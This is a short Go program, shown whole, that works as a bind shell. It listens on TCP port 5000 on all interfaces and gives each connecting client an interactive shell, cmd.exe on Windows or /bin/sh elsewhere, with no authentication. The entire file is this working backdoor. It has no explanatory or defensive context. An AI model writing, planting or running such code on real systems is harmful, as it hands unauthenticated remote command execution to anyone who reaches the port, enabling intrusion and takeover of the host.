package main

import (
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"syscall"
)

func main() {
	listener, err := net.Listen("tcp", ":5000")
	if err != nil {
		log.Fatalf("failed to bind 0.0.0.0:5000 error: %v", err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("well... some error on Accept occured...")
			continue
		}
		go handle(conn)
	}
}

func handle(conn net.Conn) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true,
		}
	}

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp

	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}